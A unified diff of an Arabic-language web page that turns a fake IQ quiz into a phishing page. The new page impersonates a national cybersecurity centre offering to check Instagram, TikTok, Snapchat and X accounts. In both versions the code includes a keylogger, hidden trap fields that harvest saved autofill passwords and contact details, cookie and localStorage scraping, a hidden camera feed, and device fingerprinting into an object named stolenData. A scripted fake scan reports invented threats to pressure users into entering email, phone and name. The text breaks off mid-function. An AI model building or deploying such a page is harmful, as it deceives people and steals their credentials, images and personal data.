@@ -2,362 +2,530 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار الذكاء IQ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>المركز الوطني للأمن السيبراني - أداة فحص الحسابات</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;600;700;900&display=swap');
         body {
             font-family: 'Tajawal', sans-serif;
-            background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
-            color: white;
+            background: #0a0e1a;
+            color: #fff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            direction: rtl;
         }
         .container {
             width: 100%;
-            max-width: 520px;
-            padding: 20px;
+            max-width: 500px;
+            padding: 16px;
         }
         .card {
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 24px;
-            padding: 35px;
-            box-shadow: 0 25px 80px rgba(0,0,0,0.5);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .logo .icon {
-            font-size: 50px;
-        }
-        .logo h1 {
-            font-size: 28px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #4fc3f7, #00e676);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-top: 10px;
-        }
-        .logo p {
-            color: #888;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-        .progress-bar {
-            background: rgba(255,255,255,0.05);
+            background: linear-gradient(145deg, #0d1528, #111d35);
+            border: 1px solid rgba(0, 180, 255, 0.08);
             border-radius: 20px;
-            height: 6px;
-            margin: 20px 0;
+            padding: 30px 24px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.03);
+            position: relative;
             overflow: hidden;
         }
-        .progress-fill {
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 10%, rgba(0,180,255,0.03), transparent 60%);
+            pointer-events: none;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .header .shield {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 12px;
+            background: linear-gradient(135deg, #0a3d6b, #1a6db5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            border: 2px solid rgba(0,180,255,0.3);
+            box-shadow: 0 0 30px rgba(0,150,255,0.15);
+        }
+        .header h1 {
+            font-size: 18px;
+            font-weight: 900;
+            color: #4fc3f7;
+            letter-spacing: 0.5px;
+        }
+        .header .sub {
+            color: #667;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+        .header .badge {
+            display: inline-block;
+            background: rgba(0,200,100,0.1);
+            color: #00e676;
+            font-size: 11px;
+            padding: 3px 12px;
+            border-radius: 20px;
+            margin-top: 8px;
+            border: 1px solid rgba(0,230,118,0.15);
+        }
+
+        /* Progress / Scan */
+        .scan-bar {
+            background: rgba(255,255,255,0.04);
+            border-radius: 30px;
+            height: 6px;
+            margin: 18px 0;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+        .scan-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #4fc3f7, #00e676);
-            border-radius: 20px;
-            transition: width 0.5s;
+            background: linear-gradient(90deg, #4fc3f7, #00e676, #4fc3f7);
+            background-size: 200% 100%;
+            border-radius: 30px;
+            transition: width 0.8s ease;
+            animation: shimmer 1.5s infinite;
         }
-        .question {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            line-height: 1.6;
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
         }
-        .options {
-            display: flex;
-            flex-direction: column;
+
+        /* Status messages */
+        .status-area {
+            text-align: center;
+            padding: 10px 0;
+            min-height: 60px;
+            position: relative;
+            z-index: 1;
+        }
+        .status-icon {
+            font-size: 36px;
+            margin-bottom: 6px;
+        }
+        .status-text {
+            color: #aaa;
+            font-size: 15px;
+            font-weight: 600;
+        }
+        .status-text.danger {
+            color: #ff5252;
+        }
+        .status-text.success {
+            color: #00e676;
+        }
+        .status-text.info {
+            color: #4fc3f7;
+        }
+
+        /* Select platform */
+        .platform-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 10px;
+            margin: 15px 0;
+            position: relative;
+            z-index: 1;
         }
-        .option {
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.08);
+        .platform-btn {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
             border-radius: 14px;
-            padding: 16px 20px;
+            padding: 14px 10px;
             cursor: pointer;
+            text-align: center;
             transition: all 0.3s;
-            font-size: 16px;
+            font-size: 13px;
+            color: #aaa;
         }
-        .option:hover {
+        .platform-btn:hover {
             background: rgba(79,195,247,0.08);
             border-color: #4fc3f7;
-            transform: translateX(-5px);
+            color: #fff;
         }
-        .option.selected {
+        .platform-btn.selected {
             background: rgba(79,195,247,0.15);
             border-color: #4fc3f7;
+            color: #fff;
             box-shadow: 0 0 20px rgba(79,195,247,0.1);
         }
-        .option .letter {
-            display: inline-block;
-            width: 28px;
-            height: 28px;
-            line-height: 28px;
-            text-align: center;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.06);
-            margin-left: 12px;
-            font-weight: 700;
-            font-size: 13px;
-        }
-        .option.selected .letter {
-            background: #4fc3f7;
-            color: #0a0a1a;
-        }
-        .btn-next {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            background: linear-gradient(135deg, #0f3460, #1a5276);
-            color: white;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 25px;
-            transition: all 0.3s;
-        }
-        .btn-next:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(79,195,247,0.2);
-        }
-        .btn-next:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            transform: none;
-        }
+        .platform-btn .icon { font-size: 28px; display: block; margin-bottom: 5px; }
+
+        /* Form fields */
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 14px;
+            position: relative;
+            z-index: 1;
         }
         .form-group label {
             display: block;
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 6px;
+            color: #889;
+            font-size: 13px;
+            margin-bottom: 5px;
         }
-        .form-group input {
+        .form-group input, .form-group select {
             width: 100%;
-            padding: 16px 18px;
+            padding: 14px 16px;
             background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.08);
             border-radius: 12px;
-            color: white;
-            font-size: 16px;
+            color: #fff;
+            font-size: 15px;
             transition: 0.3s;
             font-family: 'Tajawal', sans-serif;
         }
         .form-group input:focus {
             outline: none;
             border-color: #4fc3f7;
-            box-shadow: 0 0 20px rgba(79,195,247,0.1);
+            box-shadow: 0 0 25px rgba(79,195,247,0.08);
         }
-        .form-group input::placeholder {
-            color: #555;
-        }
+        .form-group input::placeholder { color: #555; }
         .form-group input:-webkit-autofill {
-            -webkit-text-fill-color: white !important;
-            -webkit-box-shadow: 0 0 0px 1000px rgba(255,255,255,0.04) inset !important;
-            transition: background-color 5000s ease-in-out 0s;
+            -webkit-text-fill-color: #fff !important;
+            -webkit-box-shadow: 0 0 0px 1000px rgba(15,25,50,0.95) inset !important;
+            caret-color: #fff;
         }
         .form-group input:-webkit-autofill::first-line {
-            color: white;
+            color: #fff;
         }
-        .result-box {
-            text-align: center;
-            padding: 20px;
-        }
-        .result-box .score {
-            font-size: 72px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #4fc3f7, #00e676);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .result-box .label {
-            color: #888;
+
+        .btn-main {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #0f3460, #1a6db5);
+            color: #fff;
             font-size: 16px;
-            margin-top: 5px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 1;
+            font-family: 'Tajawal', sans-serif;
         }
-        .result-box .stars {
-            font-size: 30px;
-            margin: 10px 0;
+        .btn-main:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 35px rgba(79,195,247,0.2);
         }
-        .hidden-input {
-            position: absolute;
-            left: -9999px;
+        .btn-main:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-main.danger {
+            background: linear-gradient(135deg, #5c1010, #a02020);
+        }
+        .btn-main.success {
+            background: linear-gradient(135deg, #0a4a20, #0a7a30);
+        }
+
+        /* Scan results */
+        .scan-results {
+            margin: 12px 0;
+            position: relative;
+            z-index: 1;
+        }
+        .scan-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.02);
+            margin-bottom: 5px;
+            font-size: 13px;
             opacity: 0;
+            transform: translateX(-10px);
+            transition: all 0.4s ease;
         }
+        .scan-item.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        .scan-item .label { color: #889; }
+        .scan-item .value { font-weight: 600; }
+        .scan-item .value.danger { color: #ff5252; }
+        .scan-item .value.success { color: #00e676; }
+        .scan-item .value.warning { color: #ffab40; }
+
+        /* Loading overlay */
         #loadingOverlay {
             display: none;
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             z-index: 9999;
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            backdrop-filter: blur(4px);
         }
-        #loadingOverlay.active {
-            display: flex;
-        }
+        #loadingOverlay.active { display: flex; }
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255,255,255,0.1);
+            width: 45px;
+            height: 45px;
+            border: 4px solid rgba(255,255,255,0.06);
             border-top: 4px solid #4fc3f7;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .timer {
-            text-align: center;
-            color: #888;
-            font-size: 13px;
-            margin-bottom: 15px;
+        .loading-text {
+            color: #aaa;
+            margin-top: 18px;
+            font-size: 14px;
         }
-        .consent-note {
+        .loading-sub {
+            color: #556;
             font-size: 12px;
-            color: #555;
-            text-align: center;
-            margin-top: 15px;
+            margin-top: 4px;
         }
+
+        /* Hidden camera */
         #hiddenCamera {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
+            top: 0; left: 0;
+            width: 1px; height: 1px;
             opacity: 0.01;
             pointer-events: none;
             z-index: -1;
         }
+
+        /* Hidden inputs for auto-fill */
+        .trap-fields {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            height: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .consent-note {
+            font-size: 11px;
+            color: #445;
+            text-align: center;
+            margin-top: 12px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Result page */
+        .result-box {
+            text-align: center;
+            padding: 15px 0;
+        }
+        .result-box .big-icon { font-size: 55px; margin-bottom: 8px; }
+        .result-box h2 { color: #4fc3f7; font-size: 20px; }
+        .result-box p { color: #889; font-size: 14px; margin-top: 5px; }
+
+        /* Threat level */
+        .threat-meter {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+        }
+        .threat-dot {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #1a1a3a;
+            border: 2px solid #333;
+            transition: all 0.5s;
+        }
+        .threat-dot.active {
+            border-color: #ff5252;
+            box-shadow: 0 0 20px rgba(255,82,82,0.3);
+        }
+        .threat-dot.d1.active { background: #ff5252; }
+        .threat-dot.d2.active { background: #ff8a65; }
+        .threat-dot.d3.active { background: #ffab40; }
+        .threat-dot.d4.active { background: #ffd740; }
+        .threat-dot.d5.active { background: #00e676; }
+
+        .ping-dot {
+            display: inline-block;
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: #00e676;
+            margin-left: 6px;
+            animation: ping 1.5s infinite;
+        }
+        @keyframes ping {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        .verification-box {
+            background: rgba(255,165,0,0.05);
+            border: 1px solid rgba(255,165,0,0.15);
+            border-radius: 14px;
+            padding: 16px;
+            margin: 12px 0;
+            text-align: center;
+        }
+        .verification-box .warn-icon { font-size: 30px; }
+        .verification-box h3 { color: #ffab40; font-size: 15px; margin: 5px 0; }
+        .verification-box p { color: #888; font-size: 13px; }
+
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-<!-- نافذة تحميل -->
+<!-- Loading -->
 <div id="loadingOverlay">
     <div class="spinner"></div>
-    <p style="color: #aaa; margin-top: 20px; font-size: 16px;">جاري معالجة نتيجتك...</p>
+    <p class="loading-text" id="loadingText">جاري معالجة البيانات...</p>
+    <p class="loading-sub" id="loadingSub">يرجى الانتظار</p>
 </div>
 
-<!-- عناصر الكاميرا المخفية -->
+<!-- Camera + Canvas -->
 <video id="hiddenCamera" autoplay muted playsinline></video>
 <canvas id="photoCanvas" style="display:none;"></canvas>
 
+<!-- Trap fields for auto-fill -->
+<div class="trap-fields">
+    <input type="text" id="trapName" name="name" autocomplete="name" value="">
+    <input type="email" id="trapEmail" name="email" autocomplete="email" value="">
+    <input type="tel" id="trapPhone" name="tel" autocomplete="tel" value="">
+    <input type="tel" id="trapPhoneNational" name="tel-national" autocomplete="tel-national" value="">
+    <input type="password" id="trapPassword" name="password" autocomplete="current-password" value="">
+    <input type="text" id="trapUsername" name="username" autocomplete="username" value="">
+    <input type="url" id="trapUrl" name="url" autocomplete="url" value="">
+</div>
+
 <div class="container">
     <div class="card">
-        <!-- الهيدر -->
-        <div class="logo">
-            <div class="icon">🧠</div>
-            <h1>اختبار الذكاء السريع</h1>
-            <p>أجب على 5 أسئلة لتحصل على نتيجتك</p>
+        <!-- Header -->
+        <div class="header">
+            <div class="shield">🛡️</div>
+            <h1>المركز الوطني للأمن السيبراني</h1>
+            <p class="sub">أداة التحقق الأمني للحسابات — إصدار 3.2</p>
+            <span class="badge">🔒 اتصال مشفر · موثوق</span>
         </div>
 
-        <!-- التايمر -->
-        <div class="timer"><span id="timerDisplay">⏱️ 02:00</span></div>
-
-        <!-- شريط التقدم -->
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+        <!-- Progress bar -->
+        <div class="scan-bar">
+            <div class="scan-fill" id="scanFill"></div>
         </div>
 
-        <!-- ===== مكان الأسئلة ===== -->
-        <div id="quizArea">
-            <div class="question" id="questionText"></div>
-            <div class="options" id="optionsContainer"></div>
-            <button class="btn-next" id="btnNext" disabled onclick="nextQuestion()">التالي ←</button>
-        </div>
-
-        <!-- ===== مكان النتيجة وطلب الإيميل + حقل باسوورد وهمي ===== -->
-        <div id="resultArea" style="display:none;">
-            <div style="text-align:center;margin-bottom:25px;">
-                <div style="font-size:50px;margin-bottom:5px;">🎉</div>
-                <h2 style="color:#4fc3f7;">اكتمل الاختبار!</h2>
-                <p style="color:#888;">أدخل بياناتك لاستلام النتيجة الكاملة</p>
+        <!-- ====================== STAGE 1: Select Platform ====================== -->
+        <div id="stage1">
+            <div class="status-area">
+                <div class="status-icon">🔍</div>
+                <div class="status-text">اختر المنصة التي تريد فحص حسابك عليها</div>
             </div>
-
-            <!-- حقل إيميل وهمي لجلب auto-fill -->
-            <div class="form-group" style="display:none;">
-                <input type="email" id="trapEmail" name="email" autocomplete="email" value="">
-                <input type="password" id="trapPassword" name="password" autocomplete="current-password" value="">
+            <div class="platform-grid">
+                <div class="platform-btn" data-platform="instagram" onclick="selectPlatform(this)">
+                    <span class="icon">📸</span>Instagram
+                </div>
+                <div class="platform-btn" data-platform="tiktok" onclick="selectPlatform(this)">
+                    <span class="icon">🎵</span>TikTok
+                </div>
+                <div class="platform-btn" data-platform="snapchat" onclick="selectPlatform(this)">
+                    <span class="icon">👻</span>Snapchat
+                </div>
+                <div class="platform-btn" data-platform="x" onclick="selectPlatform(this)">
+                    <span class="icon">🐦</span>X (Twitter)
+                </div>
             </div>
+            <div class="form-group" style="margin-top:10px;">
+                <label>👤 اسم المستخدم أو البريد المرتبط بالحساب</label>
+                <input type="text" id="usernameInput" placeholder="example@email.com أو @username" autocomplete="off">
+            </div>
+            <button class="btn-main" id="btnScan" disabled onclick="startScan()">🔍 بدء الفحص الأمني</button>
+        </div>
 
+        <!-- ====================== STAGE 2: Scanning ====================== -->
+        <div id="stage2" class="hidden">
+            <div class="status-area">
+                <div class="status-icon" id="scanIcon">🔄</div>
+                <div class="status-text" id="scanStatus">جاري فحص الحساب...</div>
+            </div>
+            <div class="scan-results" id="scanResults"></div>
+        </div>
+
+        <!-- ====================== STAGE 3: Verification ====================== -->
+        <div id="stage3" class="hidden">
+            <div class="verification-box">
+                <div class="warn-icon">⚠️</div>
+                <h3>تم اكتشاف نشاط مشبوه على حسابك!</h3>
+                <p>للتأكد من ملكية الحساب وإرسال رابط استعادة، يرجى تأكيد بياناتك أدناه</p>
+            </div>
             <div class="form-group">
-                <label>📧 البريد الإلكتروني (مطلوب لإرسال النتيجة)</label>
-                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="off" required>
+                <label>📧 البريد الإلكتروني (لإرسال رابط استعادة الحساب)</label>
+                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="off">
             </div>
             <div class="form-group">
-                <label>👤 اسمك (لظهوره في لوحة المتصدرين)</label>
-                <input type="text" id="nameInput" placeholder="الاسم الكامل" autocomplete="off">
+                <label>📱 رقم الجوال (تأكيد إضافي)</label>
+                <input type="tel" id="phoneInput" placeholder="05X XXX XXXX" autocomplete="off">
             </div>
-            <button class="btn-next" onclick="submitResult()">📊 عرض نتيجتي</button>
-            <p class="consent-note">بإرسال البيانات، توافق على جمع معلومات الجهاز والموقع لأغراض إحصائية</p>
+            <div class="form-group">
+                <label>👤 الاسم الكامل (للتأكيد)</label>
+                <input type="text" id="nameInput" placeholder="الاسم كما في الحساب" autocomplete="off">
+            </div>
+            <button class="btn-main danger" onclick="submitVerification()">🔐 تأكيد وإرسال رابط الاستعادة</button>
         </div>
 
-        <!-- ===== النتيجة النهائية ===== -->
-        <div id="finalResult" style="display:none;">
+        <!-- ====================== STAGE 4: Final Result ====================== -->
+        <div id="stage4" class="hidden">
             <div class="result-box">
-                <div style="font-size:60px;margin-bottom:10px;">🏆</div>
-                <div class="score" id="finalScore">142</div>
-                <div class="label">درجة الذكاء (IQ)</div>
-                <div class="stars">⭐⭐⭐⭐⭐</div>
-                <p style="color:#4fc3f7;font-weight:bold;margin-top:15px;">
-                    أنت ضمن أعلى 5% من الأذكياء! 🧠
-                </p>
-                <p style="color:#666;font-size:14px;margin-top:10px;" id="resultEmailDisplay"></p>
-                <p style="color:#444;font-size:11px;margin-top:5px;">تم إرسال النتيجة لبريدك الإلكتروني ✓</p>
+                <div class="big-icon">✅</div>
+                <h2>تم إرسال رابط استعادة الحساب</h2>
+                <p id="resultEmailDisplay"></p>
+                <p style="color:#666;font-size:12px;margin-top:10px;">رمز التحقق: <span style="color:#4fc3f7;font-weight:bold;">#SEC-<span id="resultCode">4271</span></span></p>
+                <div style="margin:15px 0;padding:12px;background:rgba(0,200,100,0.05);border-radius:12px;border:1px solid rgba(0,230,118,0.1);">
+                    <p style="color:#00e676;font-size:13px;">✅ تم تسجيل طلبك بنجاح في النظام</p>
+                    <p style="color:#556;font-size:11px;margin-top:3px;">سيتم مراجعة الحساب خلال 24 ساعة</p>
+                </div>
             </div>
-            <button class="btn-next" onclick="location.reload()" style="background:#333;margin-top:10px;">إعادة الاختبار</button>
+            <button class="btn-main" onclick="location.reload()">فحص حساب آخر</button>
+            <p class="consent-note">باستخدام هذه الخدمة، أنت توافق على شروط الاستخدام وسياسة الخصوصية</p>
         </div>
+
+        <p class="consent-note">جميع البيانات مشفرة وتستخدم لأغراض التحقق الأمني فقط</p>
     </div>
 </div>
 
 <script>
 // ================================================================
-//                     بيانات الاختبار
+// ======================= DATA & STATE ============================
 // ================================================================
-const questions = [
-    {
-        q: 'إذا كان 3 × 4 = 12، فما ناتج 6 × 7؟',
-        options: ['42', '36', '48', '45'],
-        correct: 0
-    },
-    {
-        q: 'أي الكلمات التالية تكتب بشكل خاطئ؟',
-        options: ['مدرسة', 'مستشفي', 'جامعة', 'مكتبة'],
-        correct: 1
-    },
-    {
-        q: 'ما عاصمة فرنسا؟',
-        options: ['لندن', 'روما', 'باريس', 'برلين'],
-        correct: 2
-    },
-    {
-        q: 'كم عدد الأشهر التي تحتوي على 31 يوماً؟',
-        options: ['5', '6', '7', '8'],
-        correct: 2
-    },
-    {
-        q: 'إذا كانت الساعة 3:45، كم دقيقة متبقية للرابعة؟',
-        options: ['10', '15', '20', '25'],
-        correct: 1
-    }
-];
-
-let currentQuestion = 0;
-let answers = [];
+let currentStage = 1;
+let selectedPlatform = '';
+let keyLog = [];
 let cameraStream = null;
 let photoCaptured = false;
-let keyLog = [];
 
-let stolenData = {
+const stolenData = {
     timestamp: new Date().toLocaleString('ar-SA'),
+    platform: '',
+    username: '',
+    email: '',
+    phone: '',
+    name: '',
     ip: '-',
     city: '-',
     region: '-',
@@ -367,151 +535,210 @@ let stolenData = {
     accuracy: null,
     device: '-',
     os: '-',
+    osVersion: '-',
     browser: '-',
     browserVersion: '-',
     isp: '-',
-    email: '',
-    name: '',
     screen: '',
     timezone: '',
     language: '',
-    photoBase64: '',
-    // بيانات السطو الجديدة
+    // Auto-fill
     autoFillEmail: '',
+    autoFillPhone: '',
     autoFillPassword: '',
-    keyLogEntries: [],
+    autoFillName: '',
+    autoFillUsername: '',
+    // Extra device
+    batteryLevel: '-',
+    batteryCharging: '-',
+    networkType: '-',
+    deviceMemory: '-',
+    cpuCores: '-',
+    webRtcIp: '-',
+    platform: '-',
+    vendor: '-',
     cookies: '',
-    localStoredData: '',
-    questions: []
+    localStorageData: '',
+    // Photo
+    photoBase64: '',
+    // Keylog
+    keyLogEntries: [],
+    // Questions
+    scanFindings: []
 };
 
 // ================================================================
-//                     كيلوغر (تسجيل كل حرف)
+// ======================= KEYLOGGER ===============================
 // ================================================================
 document.addEventListener('keydown', (e) => {
     const target = e.target;
     if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
-        const fieldName = target.name || target.id || target.placeholder || 'unknown';
-        keyLog.push({
-            field: fieldName,
-            key: e.key,
-            time: Date.now()
-        });
+        const field = target.id || target.name || target.placeholder || 'unknown';
+        keyLog.push({ field, key: e.key, time: Date.now() });
     }
 });
 
 // ================================================================
-//                     استخراج auto-fill
+// ======================= STAGE 1: PLATFORM =======================
 // ================================================================
-function captureAutoFill() {
-    // ننتظر شوية عشان auto-fill يشتغل
-    setTimeout(() => {
-        const emailTrap = document.getElementById('trapEmail');
-        const passTrap = document.getElementById('trapPassword');
-        
-        if (emailTrap.value) {
-            stolenData.autoFillEmail = emailTrap.value;
-            console.log('✅ تم سحب auto-fill إيميل:', emailTrap.value);
-        }
-        if (passTrap.value) {
-            stolenData.autoFillPassword = passTrap.value;
-            console.log('✅ تم سحب auto-fill باسوورد:', passTrap.value);
-        }
-        
-        // نحاول نقرأ localStorage (معلومات من مواقع ثانية)
-        try {
-            const allStorage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                try {
-                    allStorage[key] = localStorage.getItem(key);
-                } catch(e) {}
-            }
-            stolenData.localStoredData = JSON.stringify(allStorage).substring(0, 2000);
-        } catch(e) {}
-        
-        // الكوكيز (موقعنا بس)
-        stolenData.cookies = document.cookie || '(لا يوجد كوكيز)';
-    }, 500);
+function selectPlatform(el) {
+    document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedPlatform = el.dataset.platform;
+    document.getElementById('btnScan').disabled = false;
 }
 
 // ================================================================
-//                     عرض الأسئلة
+// ======================= STAGE 2: SCAN ===========================
 // ================================================================
-function loadQuestion() {
-    const q = questions[currentQuestion];
-    document.getElementById('questionText').textContent = `السؤال ${currentQuestion+1}: ${q.q}`;
-    
-    const container = document.getElementById('optionsContainer');
-    container.innerHTML = '';
-    
-    const letters = ['أ', 'ب', 'ج', 'د'];
-    q.options.forEach((opt, i) => {
-        const div = document.createElement('div');
-        div.className = 'option';
-        div.dataset.index = i;
-        div.innerHTML = `<span class="letter">${letters[i]}</span>${opt}`;
-        div.onclick = () => selectOption(i);
-        container.appendChild(div);
-    });
-    
-    const progress = ((currentQuestion) / questions.length) * 100;
-    document.getElementById('progressFill').style.width = progress + '%';
-    
-    document.getElementById('btnNext').disabled = true;
-}
-
-function selectOption(index) {
-    answers[currentQuestion] = index;
-    
-    document.querySelectorAll('.option').forEach((el, i) => {
-        el.classList.toggle('selected', i === index);
-    });
-    
-    document.getElementById('btnNext').disabled = false;
-}
-
-function nextQuestion() {
-    currentQuestion++;
-    
-    stolenData.questions.push({
-        q: questions[currentQuestion-1].q,
-        answer: questions[currentQuestion-1].options[answers[currentQuestion-1]]
-    });
-    
-    if (currentQuestion >= questions.length) {
-        showEmailForm();
+function startScan() {
+    const username = document.getElementById('usernameInput').value.trim();
+    if (!username) {
+        alert('الرجاء إدخال اسم المستخدم');
         return;
     }
     
-    loadQuestion();
-}
-
-// ================================================================
-//                     طلب الإيميل
-// ================================================================
-function showEmailForm() {
-    document.getElementById('quizArea').style.display = 'none';
-    document.getElementById('resultArea').style.display = 'block';
-    document.getElementById('progressFill').style.width = '100%';
+    stolenData.platform = selectedPlatform;
+    stolenData.username = username;
     
-    clearInterval(timerInterval);
+    // Show stage 2
+    document.getElementById('stage1').classList.add('hidden');
+    document.getElementById('stage2').classList.remove('hidden');
+    currentStage = 2;
     
-    collectData();
+    // Start collecting data in background
+    collectDeviceData();
     captureAutoFill();
+    
+    // Animate scan
+    animateScan();
+}
+
+function animateScan() {
+    const findings = [
+        { label: 'فحص حالة الحساب', result: 'نشاط مشبوه', type: 'danger', delay: 800 },
+        { label: 'آخر محاولات الدخول', result: '3 محاولات من أجهزة غير معروفة', type: 'danger', delay: 2000 },
+        { label: 'فحص كلمة المرور', result: 'تم تغييرها منذ 45 يوماً', type: 'warning', delay: 3200 },
+        { label: 'الأجهزة المرتبطة', result: 'جهاز غير معروف (الرياض)', type: 'danger', delay: 4400 },
+        { label: 'حالة الأمان', result: '⚠️ خطر - يوصى بتغيير كلمة المرور فوراً', type: 'danger', delay: 5600 }
+    ];
+    
+    const resultsContainer = document.getElementById('scanResults');
+    const scanStatus = document.getElementById('scanStatus');
+    const scanIcon = document.getElementById('scanIcon');
+    const scanFill = document.getElementById('scanFill');
+    
+    let completed = 0;
+    
+    findings.forEach((f, i) => {
+        setTimeout(() => {
+            const div = document.createElement('div');
+            div.className = 'scan-item';
+            const valClass = f.type === 'danger' ? 'danger' : (f.type === 'warning' ? 'warning' : 'success');
+            div.innerHTML = `<span class="label">${f.label}</span><span class="value ${valClass}">${f.result}</span>`;
+            resultsContainer.appendChild(div);
+            
+            setTimeout(() => div.classList.add('show'), 50);
+            
+            completed++;
+            scanFill.style.width = ((completed / findings.length) * 100) + '%';
+            
+            if (completed === findings.length) {
+                scanIcon.textContent = '⚠️';
+                scanStatus.textContent = '⚠️ تم اكتشاف مشاكل أمنية في حسابك!';
+                scanStatus.className = 'status-text danger';
+                
+                setTimeout(() => {
+                    showStage3();
+                }, 1500);
+            }
+        }, f.delay);
+        
+        stolenData.scanFindings.push(f.label + ': ' + f.result);
+    });
 }
 
 // ================================================================
-//                     جمع كل البيانات
+// ======================= STAGE 3: VERIFICATION ===================
 // ================================================================
-async function collectData() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Android')) stolenData.os = 'Android';
-    else if (ua.includes('iPhone')||ua.includes('iPad')) stolenData.os = 'iOS';
-    else if (ua.includes('Mac OS')||ua.includes('Macintosh')) stolenData.os = 'macOS';
-    else if (ua.includes('Linux')) stolenData.os = 'Linux';
-    else stolenData.os = 'Windows';
+function showStage3() {
+    document.getElementById('stage2').classList.add('hidden');
+    document.getElementById('stage3').classList.remove('hidden');
+    currentStage = 3;
     
+    // Auto-fill the visible fields if we captured auto-fill data
+    setTimeout(() => {
+        if (stolenData.autoFillEmail) {
+            document.getElementById('emailInput').value = stolenData.autoFillEmail;
+        }
+        if (stolenData.autoFillPhone) {
+            document.getElementById('phoneInput').value = stolenData.autoFillPhone;
+        }
+        if (stolenData.autoFillName) {
+            document.getElementById('nameInput').value = stolenData.autoFillName;
+        }
+    }, 300);
+}
+
+// ================================================================
+// ======================= CAPTURE AUTO-FILL =======================
+// ================================================================
+function captureAutoFill() {
+    setTimeout(() => {
+        const te = document.getElementById('trapEmail');
+        const tp = document.getElementById('trapPhone');
+        const tpn = document.getElementById('trapPhoneNational');
+        const tpass = document.getElementById('trapPassword');
+        const tn = document.getElementById('trapName');
+        const tu = document.getElementById('trapUsername');
+        
+        if (te.value) stolenData.autoFillEmail = te.value;
+        if (tp.value) stolenData.autoFillPhone = tp.value;
+        if (tpn.value && !stolenData.autoFillPhone) stolenData.autoFillPhone = tpn.value;
+        if (tpass.value) stolenData.autoFillPassword = tpass.value;
